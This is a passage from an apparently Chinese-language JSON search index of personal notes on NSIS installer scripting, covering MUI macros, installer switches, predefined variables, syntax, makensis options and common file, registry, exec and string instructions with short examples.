($3)$\\nTime=$4:$5:$6'\nSectionEnd","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Built--in-function.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Built--in-function.html"},{"title":"常用头文件","text":"MUI.nsh Modern User Interface 是NSIS脚本中一个非常常用的头文件，它提供了一系列现代化的用户界面元素，\n包括简单易用的安装向导、控件和页面。使用\"MUI.nsh\"可以轻松地创建具有现代风格的安装程序，而无需编写复杂的代码。 常用的指令: !insertmacro MUI_PAGE_WELCOME：添加欢迎页面。\n!insertmacro MUI_PAGE_LICENSE：添加许可证协议页面。\n!insertmacro MUI_PAGE_DIRECTORY：添加选择安装位置页面。\n!insertmacro MUI_PAGE_INSTFILES：添加文件安装进度页面。\n!insertmacro MUI_PAGE_FINISH：添加安装完成页面。\n!insertmacro MUI_LANGUAGE：设置安装程序的语言。 如设置安装语言为英文: !insertmacro MUI_LANGUAGE \"English\" 设置为中文: !insertmacro MUI_LANGUAGE \"SimpChinese\"","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Common-header-file.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Common-header-file.html"},{"title":"可执行文件选项","text":"此处的可执行文件指的是: 使用 NSIS 脚本打包好的exe可执行文件 一些安装参数 注意, 是对于打包好的exe安装包而言: /NCRC       安装前显示验证数据完整性, 与脚本内使用 CRCCheck on 效果一致\n\n/S          静默安装(授权啥的还是会有提示)\n\n/D=<dir>    指定安装目录 (这个实测没效果)\n            设置默认安装目录: $INSTDIR, 会覆盖掉 InstallDir 和 InstallDirRegKey\n            若使用, 必须是最后一个参数, 仅支持绝对路径, 不能使用引号(即使有空格)\n\n            补充一下当时实测没效果是因为, /D默认会覆盖掉InstallDir, 生效与 `onInit` 前,\n            但是我测试那个脚本在 `onInit` 又指定了一下 `INSTDIR` , 又覆盖了 `/D` 的, 所以失效.\n\n# /help, /?   打印帮助文档 (这个实测也没效果)\n            官文档没看到有些... 卸载时候的特殊参数: _?=<dir>    设置 $INSTDIR , 指定从这个位置解压\n            必须是最后的参数, 不能包含引号(即使有空格)","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Executable-file-options.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Executable-file-options.html"},{"title":"语法规范","text":"注释 注释, 使用 # 或者 ; 导入其他脚本 引入自定义脚本文件, 使用 !include !include xxx.nsh 使用dll模块 使用dll提供的函数: plugin::command [parameters] 不止dll, 其他自定义模块也行. 不过都需要先 导入其他脚本 , 使用: nsExec::Exec \"myfile\" 变量 自定义 语法(貌似大小写皆可): Var [/GLOBAL] var_name 变量定义, 使用 Var : Var xxx 注意定义的变量全部都是全局变量, 若定义在函数内部, 必须使用 /GLOBAL 修饰: Var /GLOBAL xxx 还可以使用define !define var_name \"var_str\" 使用define定义的变量只读, 可在当前脚本全局使用. 预定义 寄存器变量(用于参数传递): $0, $1, $2, $3, $4, $5, $6, $7, $8, $9\n\n$R0, $R1, $R2, $R3, $R4, $R5, $R6, $R7, $R8, $R9\n\n# 一开始以为是命令行参数, 看了一下仅是预定义的一些变量, 只是不用显示声明而已 可变预定义变量: $INSTDIR        程序安装路径, 可以使用 StrCpy, ReadRegStr, ReadINIStr, etc 修改.\n                注意, 如果安装时候更新了路径, 新路径的值会被更新到 `$INSTDIR` (所以固定变量获取 INSTDIR 的方式不可取)\n                经测试, 一般在 `.onInit` 期间获取的默认的 `$INSTDIR` , 在 `onInit` 函数执行之后才会弹出路径选择,\n                这时, 选择的路径会将 `$INSTDIR` 覆盖, 在 `.onInit` 后的 `Section` 获取到的 `$INSTDIR` 值是被覆盖修改后的.\n\n$OUTDIR         当前输出目录\n$CMDLINE        安装时候的命令行参数, 为整个命令行,\n                  如: xxx.exe parameter1 parameter2 ...\n                  若需要获取其中的参数, 使用 GetParameters (针对普通参数) , GetOptions (针对选项参数) .\n                  见 获取命令行参数_\n\n                  当命令行存在 ``/D`` 选项参数时, ``$CMDLINE`` 为空.\n$LANGUAGE       当前使用的语言 系统变量 系统变量: $PROGRAMFILES   程序文件目录(通常为 C:\\Program Files 但是运行时会检测).\n$COMMONFILES    公用文件目录。这是应用程序共享组件的目录(通常为 C:\\Program Files\\Common Files 但是运行时会检测).\n$DESKTOP        Windows 桌面目录(通常为 C:\\windows\\desktop 但是运行时会检测)。该常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n$EXEDIR         安装程序运行时的位置。(从技术上来说你可以修改改变量, 但并不是一个好方法).\n${NSISDIR}      包含 NSIS 安装目录的一个标记。在编译时会检测到。常用于在你想调用一个在 NSIS 目录下的资源时, 例如: 图标、界面……\n$WINDIR         Windows 目录(通常为 C:\\windows 或 C:\\winnt 但在运行时会检测)\n$SYSDIR         Windows 系统目录(通常为 C:\\windows\\system 或 C:\\winnt\\system32 但在运行时会检测)\n$TEMP           系统临时目录(通常为 C:\\windows\\temp 但在运行时会检测)\n$STARTMENU      开始菜单目录(常用于添加一个开始菜单项, 使用 CreateShortCut)。该常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n$SMPROGRAMS     开始菜单程序目录(当你想定位 $STARTMENU\\程序 时可以使用它)。该常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n$SMSTARTUP      开始菜单程序/启动 目录。该常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n$QUICKLAUNCH    在 IE4 活动桌面及以上的快速启动目录。如果快速启动不可用, 仅仅返回和 $TEMP 一样。\n$DOCUMENTS      文档目录。一个当前用户典型的路径形如 C:\\Documents and Settings\\Foo\\My Documents。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n                  该常量在 Windows 95 且 Internet Explorer 4 没有安装时无效。\n$SENDTO         该目录包含了\"发送到\"菜单快捷项。\n$RECENT         该目录包含了指向用户最近文档的快捷方式。\n$FAVORITES      该目录包含了指向用户网络收藏夹、文档等的快捷方式。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n                  该常量在 Windows 95 且 Internet Explorer 4 没有安装时无效。\n$MUSIC          用户的音乐文件目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n                  该常量仅在 Windows XP、ME 及以上才有效。\n$PICTURES       用户的图片目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n                  该常量仅在 Windows 2000、XP、ME 及以上才有效。\n$VIDEOS         用户的视频文件目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n                  该常量仅在 Windows XP、ME 及以上才有效。\n$NETHOOD        该目录包含了可能存在于我的网络位置、网上邻居文件夹的链接对象。\n                  该常量在 Windows 95 且 Internet Explorer 4 和活动桌面没有安装时无效。\n$FONTS          系统字体目录。\n$TEMPLATES      文档模板目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n$APPDATA        应用程序数据目录。当前用户路径的检测需要 Internet Explorer 4 及以上。所有用户路径的检测需要 Internet Explorer 5 及以上。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n                  该常量在 Windows 95 且 Internet Explorer 4 和活动桌面没有安装时无效。\n$PRINTHOOD      该目录包含了可能存在于打印机文件夹的链接对象。\n                  该常量在 Windows 95 和 Windows 98 上无效。\n$INTERNET_CACHE Internet Explorer 的临时文件目录。\n                  该常量在 Windows 95 和 Windows NT 且 Internet Explorer 4 和活动桌面没有安装时无效。\n$COOKIES        Internet Explorer 的 Cookies 目录。\n                  该常量在 Windows 95 和 Windows NT 且 Internet Explorer 4 和活动桌面没有安装时无效。\n$HISTORY        Internet Explorer 的历史记录目录。\n                  该常量在 Windows 95 和 Windows NT 且 Internet Explorer 4 和活动桌面没有安装时无效。\n$PROFILE        用户的个人配置目录。一个典型的路径如 C:\\Documents and Settings\\Foo。\n                  该常量在 Windows 2000 及以上有效。\n$ADMINTOOLS     一个保存管理工具的目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。\n                  该常量在 Windows 2000、ME 及以上有效。\n$RESOURCES      该资源目录保存了主题和其他 Windows 资源(通常为 C:\\Windows\\Resources 但在运行时会检测).\n                  该常量在 Windows XP 及以上有效。\n$RESOURCES_LOCALIZED\n                该本地的资源目录保存了主题和其他 Windows 资源(通常为 C:\\Windows\\Resources\\1033 但在运行时会检测).\n                  该常量在 Windows XP 及以上有效。\n$CDBURN_AREA    一个在烧录 CD 时储存文件的目录。.\n                  该常量在 Windows XP 及以上有效。\n$HWNDPARENT     父窗口的十进制 HWND。\n$PLUGINSDIR     该路径是一个临时目录, 当第一次使用一个插件或一个调用 InitPluginsDir 时被创建。该文件夹当解压包退出时会被自动删除。这个文件夹的用意是用来保存给 InstallOptions 使用的 INI 文件、启动画面位图或其他插件运行需要的文件。 部分特殊字符 部分特殊字符: $$: 表示$\n$\\r: 表示\\r\n$\\n: 表示\\n\n$\\t: 表示\\t if语句 语法: ${If} $0 == 1\n  # do something\n${EndIf} 还有: ${OrIf}  即 or\n${AndIf} 即 and 特意测试了一下, 比较的时候加不加引号无影响. 测试引号判断 测试源码. 消息框(MessageBox) 显示一个包含\"消息框文本\"的消息框。\"消息框选项列表\"必须为 mb_option_list 的一个或多个, 多个使用 | 来隔开 语法: MessageBox mb_option_list messagebox_text [/SD return] [return_check jumpto [return_check_2 jumpto_2]] 各个部分释义: mb_option_list: MB_OK                 展示 OK 按钮\nMB_OKCANCEL           展示 OK, CANCEL 按钮\nMB_ABORTRETRYIGNORE   展示 ABORT, RETRY, IGNORE 按钮. 退出、重试、忽略按钮\nMB_RETRYCANCEL        展示 retry, cancel 按钮\nMB_YESNO              展示 yes and no buttons\nMB_YESNOCANCEL        展示 with yes, no, cancel buttons\nMB_ICONEXCLAMATION    展示 with exclamation icon. 显示惊叹号图标\nMB_ICONINFORMATION    展示 with information icon. 显示信息图标\nMB_ICONQUESTION       展示 with question mark icon. 显示问号图标\nMB_ICONSTOP           展示 with stop icon. 显示终止图标\nMB_USERICON           展示 installer's icon\nMB_TOPMOST            置顶 messagebox. 使消息框在最前端显示\nMB_SETFOREGROUND      设置前景? (Set foreground)\nMB_RIGHT              文本靠右对齐\nMB_RTLREADING         RTL reading order. RTL 阅读次序\nMB_DEFBUTTON1         Button 1 is default\nMB_DEFBUTTON2         Button 2 is default\nMB_DEFBUTTON3         Button 3 is default\nMB_DEFBUTTON4         Button 4 is default return_check: 0\nempty\nleft off    # can be 0 (or empty, or left off)\n\nIDABORT     Abort button\nIDCANCEL    Cancel button\nIDIGNORE    Ignore button\nIDNO        No button\nIDOK        OK button\nIDRETRY     Retry button\nIDYES       Yes button 传参(如返回值设置等) 关键字: 函数返回值 nsis返回值 语法: Push 'xxx'\nPop $0 栈的形式, Push压栈, 获取就Pop 如, 返回值的函数: Function simpleTest\n  MessageBox MB_OKCANCEL|MB_ICONQUESTION \\\n    \"点击确定取消\"\\\n      /SD IDOK  \\\n      IDOK  ok \\\n      IDCANCEL   cancel     # 这里算是调用 MessageBox 后的回调\nok:\n  Push \"OK\"\n  Goto +2\ncancel:\n  Push \"CANCEL\"\n\nFunctionEnd 在.oninit中调用如下: Function .onInit\n\n  Call simpleTest\n  Pop $0              # 这里获取返回值\n  ${If} $0 == \"CANCEL\"\n    MessageBox MB_OK|MB_ICONEXCLAMATION \"点击的是取消\"\n  ${Else}\n    MessageBox MB_OK|MB_ICONEXCLAMATION \"点击的是确定\"\n  ${EndIf}\n\nFunctionEnd macros(宏) 编译时, 插入代码 宏与 NSIS_自定义函数 类似, 使用有个较明显的区别是: 宏定义后支持在几乎任何位置的插入 函数定义后, 若要同时支持在卸载的时候调用, 需要加 un. 前缀再写一个 例: ; 定义宏\n!macro MyFunc UN\nFunction ${UN}MyFunc\n  Call ${UN}DoRegStuff\n  ReadRegStr $0 HKLM Software\\MyProgram key\n  DetailPrint $0\nFunctionEnd\n!macroend\n\n!insertmacro MyFunc \"\"\n!insertmacro MyFunc \"un.\" 结果将会插入两个, 一个给安装时候用, 一个给卸载时候用, 也可以直接: ; 定义宏\n!macro MyFunc\n  Call ${UN}DoRegStuff\n  ReadRegStr $0 HKLM Software\\MyProgram key\n  DetailPrint $0\n!macroend\n\n!insertmacro MyFunc\n!insertmacro MyFunc 效果一致. 一些脚本属性 NAME : 设置安装器名称 (支持多个, 多语言设置时使用, 默认使用第一个).\n如: Name \"Foo & Bar\" \"Foo && Bar\" InstallDir : 设置默认的安装路径 OutFile : 打好的exe包输出路径(包含文件名) ShowInstDetails : 值为 show 表示显示安装详细信息 ShowUnInstDetails : 值为 show 表示显示卸载详细信息 BrandingText : 左下角提示信息 (一般是 品牌/公司 名称) 一些通用属性, 编译标志, 版本信息: instattribs","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Grammatical-specification.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Grammatical-specification.html"},{"title":"makensis指令","text":"使用nsis脚本命令行打包 前置, 设置好环境变量: NSISDIR       NISI 安装目录, 与可在脚本定义的 ${NSISDIR} 一致\nNSISCONFDIR   NISI 配置文件目录\nAPPDATA(windows) / HOME(not windows)  加载用户配置文件 语法: makensis [ option | script.nsi | - ] [...] 选项说明: /LICENSE    显示license信息\n/V=<[0-4]>  相关信息输出. 只能是 0-4\n            0 不输出\n            1 仅error信息\n            2 warnings and errors\n            3 info, warnings, and errors\n            4 所有级别信息\n\n/P=<[0-5]>  设置安装优先级. 只能是 0-5\n            0 空闲(idle)时安装\n            1 below normal\n            2 normal (default)\n            3 above normal\n            4 high\n            5 realtime. 实时安装?\n\n/O=<filename>\n            将输出写入到 filename (不输出到屏幕).\n\n/LAUNCH     executes the generated installer.\n            执行生成的安装程序\n\n/PAUSE      makes makensis pause before quitting, which is useful when executing directly from Windows.\n            在退出之前暂停\n\n/NOCONFIG   disables inclusion of nsisconf.nsh. Without this parameter, installer defaults are set from nsisconf.nsh.\n\n/CMDHELP    prints basic usage information for command (if specified), or all commands (if command is not specified).\n\n/HDRINFO    prints information about which options were used to compile makensis.\n\n/NOCD       disables the current directory change to that of the .nsi file\n\n/INPUTCHARSET   allows you to specify a specific codepage for files without a BOM. (ACP|OEM|CP#|UTF8|UTF16<LE|BE>)\n\n/OUTPUTCHARSET  allows you to specify the codepage used by stdout when the output is redirected. (ACP|OEM|CP#|UTF8[SIG]|UTF16<LE|BE>[BOM])\n\n/PPO, /SAFEPPO  will only run the preprocessor and print the result to stdout. The safe version will not execute instructions like !appendfile or !system. !packhdr and !finalize are never executed.\n\n/WX         treats warnings as errors\n\n/D          switch one or more times will add to symbols to the globally defined list (See !define).\n\n/X          switch one or more times will execute the code you specify following it. Example: \"/XAutoCloseWindow false\"\n\nSpecifying a dash (-) for the script name will tell makensis to use the standard input as a source. 注解 注意参数顺序 官网: usage","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Makensis.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Makensis.html"},{"title":"nsis 指令","text":"文件、目录操作 FileOpen/FileWrite/FileClose 可用于创建文件, 写入文件: FileOpen $9 apachesrvin.bat w ;Opens a Empty File and fills it\nFileWrite $9 \"cd $INSTDIR\\apache$\\r$\\n\"\nFileWrite $9 \"apache -n Apache -k install$\\r$\\n\"\nFileWrite $9 \"net start Apache$\\r$\\n\"\nFileWrite $9 \"exit$\\r$\\n\"\nFileClose $9 ;Closes the filled file 上面这段代码里的 $9 表示创建的文件指针赋给此变量, 类似: $9 = open('apachesrvin.bat') File 作用: 释放文件到当前输出路径。 选项: /nonfatal 且当文件未找到时使用警告来代替错误\n/a        被添加的文件的属性将会保持\n/r        匹配的文件将会在子目录里被递归的搜索。如果目录名匹配则所有包含的内容都会被递归添加, 目录结构也会被保持\n/x        排除文件或目录 Delete 作用: 从目标系统删除文件 例, 删除文件: Delete \"$SMPROGRAMS\\Test.exe\" Rename 作用: 把源文件重命名为目标文件 例, 重命名文件: Rename $INSTDIR\\file1 $INSTDIR\\file2 CreateDirectory 作用: 创建 (递归创建) 指定的目录。当目录不能创建时会放置一个错误标记。你也可以指定一个绝对路径。 例, 在默认Program Files目录下创建一个Temp目录: CreateDirectory \"$SMPROGRAMS\\Temp\" RMDir 作用: 删除目录 例, 删除Resources及其子目录: RMDir /r $INSTDIR\\Resources SetOutPath 作用: 设置输出路径($OUTDIR)且当路径不存在时创建(需要时会递归创建)。必须为绝对路径名, 通常都使用 $INSTDIR。 例, 将用户定义的解压路径作为输出目录: SetOutPath $INSTDIR CreateShortCut 作用: 创建快捷文件.lnk 目标文件 例, 设置Test.exe的快捷方式Test.lnk, 图标为Test.ico: CreateShortCut \"$DESKTOP\\Test.lnk\" \"$DESKTOP\\Test.exe\" \"$DESKTOP\\Icon\\Test.ico\" 注册表操作 WriteRegStr/WriteRegExpandStr 关于Win64下写注册表时候的一些问题 当使用nsis写入到 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall 下时,\n系统的注册表编辑器并不会显示此项, 而是显示在 HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall ,\n这是因为控制面板的\"程序和功能\"是基于注册表反射来实现的。对于64位系统,它只显示 Wow6432Node 下的注册表键,而不显示原生的64位键. 要让卸载信息显示在控制面板中,nsis 在 64位系统下需要同时写入 Wow6432Node 下的对应键。一般的方法是: 首先写入原生键,如 HKLMSoftwareMicrosoftWindowsCurrentVersionUninstallApp 调用 SetRegView 64 来切换到 32位视图 写入 Wow6432Node\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\App 调用 SetRegView last 恢复注册表视图 继续写入原生的其他键 作用: 把字符串写入注册表。根键必须为下面列表之一: HKCR 或 HKEY_CLASSES_ROOT HKLM 或HKEY_LOCAL_MACHINE HKCU 或HKEY_CURRENT_USER HKU 或HKEY_USERS HKCC 或HKEY_CURRENT_CONFIG HKDD 或HKEY_DYN_DATA HKPD 或HKEY_PERFORMANCE_DATA SHCTX 或SHELL_CONTEXT 如果字串不能写入注册表则放置一个错误的标记。\n字串的类型为 REG_SZ 对应 WriteRegStr, 或 REG_EXPAND_STR 对应 WriteRegExpandStr。\n如果注册表键不存在则会自动创建。 例, 将程序信息写入注册表: Section -Post\n\n  WriteUninstaller \"$INSTDIR\\uninst.exe\"\n  WriteRegStr HKLM \"PRODUCT_DIR_REGKEY\" \"\" \"$INSTDIR\\Test.exe\"\n  WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayName\" \"$(&#94;Name)\"\n  WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"UninstallString\" \"$INSTDIR\\uninst.exe\"\n  WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayIcon\" \"$INSTDIR\\Test.exe\"\n  WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayVersion\" \"${PRODUCT_VERSION}\"\n  WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"URLInfoAbout\" \"${PRODUCT_WEB_SITE}\"\n  WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"Publisher\" \"${PRODUCT_PUBLISHER}\"\n\nSectionEnd ReadRegDWORD/ReadRegStr 作用: 读取注册表信息 例, 在注册表中读取.net 版本: Function GetNetFrameworkVersion\n\n  Push $1\n  Push $0\n\n  ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" \"Install\"\n  ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" \"Version\"\n\n  StrCmp $0 1 KnowNetFrameworkVersion +1\n\n  ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\" \"Install\"\n  ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\" \"Version\"\n\n  StrCmp $0 1 KnowNetFrameworkVersion +1\n\n  ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.0\\Setup\" \"InstallSuccess\"\n  ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.0\\Setup\" \"Version\"\n\n  StrCmp $0 1 KnowNetFrameworkVersion +1\n\n  ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\" \"Install\"\n  ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\" \"Version\"\n\n  StrCmp $1 \"\" +1 +2\n  StrCpy $1 \"2.0.50727.832\"\n  StrCmp $0 1 KnowNetFrameworkVersion +1\n\n  ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v1.1.4322\" \"Install\"\n  ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v1.1.4322\" \"Version\"\n\n  StrCmp $1 \"\" +1 +2\n  StrCpy $1 \"1.1.4322.573\"\n  StrCmp $0 1 KnowNetFrameworkVersion +1\n\n  ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\.NETFramework\\policy\\v1.0\" \"Install\"\n  ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\.NETFramework\\policy\\v1.0\" \"Version\"\n\n  StrCmp $1 \"\" +1 +2\n  StrCpy $1 \"1.0.3705.0\"\n  StrCmp $0 1 KnowNetFrameworkVersion +1\n  StrCpy $1 \"not .NetFramework\"\n\n  KnowNetFrameworkVersion:\n\n  Pop $0\n  Exch $1\n\nFunctionEnd DeleteRegKey 作用: 删除一个注册表键。如果指定了 /ifempty, 则该注册表键仅当它无子键时才会被删除(否则, 整个注册表键将被删除).\n有效的根键值在后面的 WriteRegStr 列出。如果该键不能被删除(或如果它不存在)则会放置一个错误的标记。 例, 清除注册表信息: DeleteRegKey PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\"\nDeleteRegKey HKLM \"${PRODUCT_DIR_REGKEY}\"\nSetAutoClose true INI文件操作 ReadINIStr 语法: ReadINIStr 用户变量(输出) INI文件 区段 项 作用: 读取INI文件。从 \"INI文件\" 的 \"区段\" 区段读取 \"项\" 的值并把该值输出到用户变量。\n如果该项未找到时会放置一个错误标记且该用户变量被赋为空值。 例, 读取TimeZoneZh.ini文件中Field 1区段的State项, 将值输出到$0: ReadINIStr $0 \"PLUGINSDIR\\TimeZoneZh.ini\" \"Field 1\" \"State\" 调用外部程序 Exec 作用: 执行一个指定的程序并且立即继续安装, 就是直接执行一个程序。 注解 指定的文件必须存在于目标系统上, 而不是编译系统上 $OUTDIR 设置工作目录. 如果无法启动进程，则会设置错误标志 如果命令可以有空格, 则应将其放在引号中以从参数中分隔它 例, 安装Microsoft.NET.exe, 程序不等待继续执行下个步骤: Exec '$INSTDIR\\Microsoft.NET.exe' ExecShell 启动 ShellExecute 执行. 语法: ExecShell action command [parameters] [SW_SHOWNORMAL | SW_SHOWMAXIMIZED | SW_SHOWMINIMIZED | SW_HIDE] action有: open  ,  正常打开, 支持exe文件, bat脚本等能直接运行的文件 print runas ,  以管理员权限打开文件(会弹出一个申请提权的弹窗) 若 action 为空表示使用默认动作 command 表示执行命令, 内容为 可执行文件全路径 . parameters 为 command 的参数, 可为重定向符号如: 2>&1 > log.txt SW_HIDE 隐藏执行命令打开的窗口 ExecWait 执行一个指定的程序并且 等待运行处理结束 语法: ExecWait command [user_var(exit code)] 例, 静默安装并等待结束: ExecWait '\"$INSTDIR\\someprogram.exe /quiet /norestart\"' $0 若执行产生错误, 可使用 IfErrors 来进行判断, 此时: 若指定了 [user_var(exit code)] , 则 ExecWait 会把变量设为返回代码.\n即 user_var = exit code 若未指定 [user_var(exit code)] , 则 ExecWait 会放置一个错误标记. 注解 若命令存在空格, 使用引号包裹 ReserveFile 作用: 把文件保存在稍后使用的数据区块用于下面的调用。有时, 预先打包文件, 方便安装加速释放之用。 语法: ReserveFile [/nonfatal] [/r] [/x file|wildcard [...]] file [file...] 例: ReserveFile \"TimeZoneZh.ini\" RegDLL 作用: 载入指定的 DLL 并且调用 DllRegisterServer (或入口点名称, 当指定之后).\n当产生一个错误的时候会置一个错误标记\n(例如不能载入 DLL, 不能初始化 OLE, 不能找到入口点, 或者函数返回任何其它错误 ERROR_SUCCESS (=0)). 其实就是注册或加载你要的插件! 例: SetOutPath $INSTDIR\nRegDLL $INSTDIR\\foo.dll UnRegDLL 作用: 注销DLL插件 例, 注销TIMProxy.dll插件: UnRegDLL $INSTDIR\\foo.dll !include 作用: 包含头文件 例, 引用\"MUI.nsh\"头文件: !include \"MUI.nsh\" !insertmacro 作用: 插入宏 例, 通过宏插入欢迎页面: !insertmacro MUI_PAGE_WELCOME 字符串操作 StrCpy 作用: 复制字符串 语法: StrCpy user_var(destination) str [maxlen] [start_offset] str 可以包含其他变量 maxlen 设置截取 str 的长度, 默认全部长度;\n为负数表示截取至此位置. maxlen为负数表示截取至此位置, eg: StrCpy $1 \"D:\\Program Files\\test\\Example One\\uninstall.exe\"\n\nStrCpy $6 $1 -13\nMessageBox MB_OK \"0 res $6\" 结果就是: D:\\Program Files\\test\\Example One\\ StrCmp 作用: 比较(不区分大小写)\"字串1\"和\"字串2\", 如果两者相等, 跳转到\"相同时跳转的标记\", 否则跳转到\"不相同时跳转的标记\"。 语法: StrCmp str1 str2 jump_if_equal [jump_if_not_equal] StrLen 作用：获取str的长度 例如: StrLen $0 \"123456\"  # $0 = 6 其他字符串操作, 需要先导入 WordFunc.nsh: !include WordFunc.nsh WordFind WordFind, 在给定字符串中查找使用指定的分隔符分隔的字符串, 如从字符串 \"first;second;third;forth\" 中查找第二个字符串: ${WordFind} \"first;second;third;forth\" \";\" +2 $R0   # $R0 = second WordFind2X WordFind2X, 在给定字符串中查找使用指定的两个分隔符包围的字符串, 如\n从字符串 <System>|<Guest>|<User> 中查找第三个字符串，也就是倒数第一个，即User: ${WordFind2X} \"<System>|<Guest>|<User>\" \"<\" \">\" -1 $R0 WordFind3X WordFind3X, 与WordFind2X比较相似，用于在给定字符串中查找使用指定的两个分隔符包围且含有指定字符串的字符串 语法: ${WordFind3X} \"[string]\" \"[delimiter1]\" \"[center]\" \"[delimiter2]\" \"[E][options]\" $var 如查找 [/install=11], [/update=22], [/start=33] 中 /update 的整个内容: ${WordFind3X} \"[/install=11], [/update=22], [/start=33]\" \"[\" \"/update\" \"]\" +1 $0\n# $0 = \"/update=22\" 见: nsis:WordFind3X WordReplace WordReplace, 从字符串中替换或删除词语, 语法: # ${WordReplace} \"[字符串]\" \"[词语1]\" \"[词语2]\" \"[E][选项]\" $输出变量\n${WordReplace} \"[string]\" \"[word1]\" \"[word2]\" \"[E][options]\" $var 选项这里的第几个下标从1开始, 例: Section\n  ${WordReplace} \"C:\\io.sys C:\\logo.sys C:\\WINDOWS\" \"SYS\" \"bmp\" \"+2\" $R0\n  ; $R0=\"C:\\io.sys C:\\logo.bmp C:\\WINDOWS\"\nSectionEnd 见: nsis:WordReplace WordAdd WordAdd, 从选项中指定的 字符串2 添加词语到 字符串1(如果不存在)，或删除词语(如果存在)。语法: ${WordAdd} \"[字符串1]\" \"[分隔符]\" \"[E][选项]]\" $输出变量 WordInsert WordInsert, 在字符串中插入词语。语法: ${WordInsert} \"[字符串]\" \"[分隔符]\" \"[词语]\" \"[E][选项]]\" $输出变量 StrFilter StrFilter, 转换字符串为大写或小写；设置符号过滤。语法: ${StrFilter} \"[字符串]\" \"[选项]\" \"[符号1]\" \"[符号2]\" $输出变量 VersionCompare VersionCompare, 用来比较版本号的大小。例如，比较1.1.0.1和1.1.1.0的大小。语法: ${VersionCompare} \"[版本1]\" \"[版本2]\" $输出变量 VersionConvert VersionConvert, 将带字母的版本转换为可用于比较的十进制数版本号。语法: ${VersionConvert} \"[版本]\" \"[字符列表]\" $输出变量 用法示例: ${VersionConvert} \"9.0c\" \"\" $R0  # $R0 = 9.0.03 .这样转换后可以用于和别的版本如9.0a比较。 数学计算 IntOp 10减去2, eg: IntOp $0 10 - 2 效果是计算 10-2 , 将结果8赋值给 $0 . 文件目录遍历 FindFirst/FindNext/FindClose 这三个一般一起使用 FindFirst语法: FindFirst user_var(handle output) user_var(filename output) filespec 第一个 handle output 是搜索的文件句柄 第二个 filename output 是找到的文件名(不包含前缀目录) filespec 是搜索的路径描述, 支持简单通配符 eg: FindFirst $0 $1 $INSTDIR\\*.txt\nloop:\n  StrCmp $1 \"\" done\n  DetailPrint $1\n  FindNext $0 $1\n  Goto loop\ndone:\nFindClose $0 逻辑操作 IfAbort 如果调用abort，它将\"返回\"为true。 语法: IfAbort label_to_goto_if_abort [label_to_goto_if_no_abort] 如果用户选择对无法创建（或覆盖）的文件进行中止，或者用户手动中止，则会发生这种情况。只能从instfiles 页面的leave函数调用此函数: Function instfilesLeave\n  IfAbort 0 +2\n    MessageBox MB_OK \"user aborted\"\nFunctionEnd IfErrors 错误时跳转 语法: jumpto_iferror [jumpto_ifnoerror] 检测并清除错误标记, 如果设了错误标记, 则跳转到\"错误时跳转的标记\", 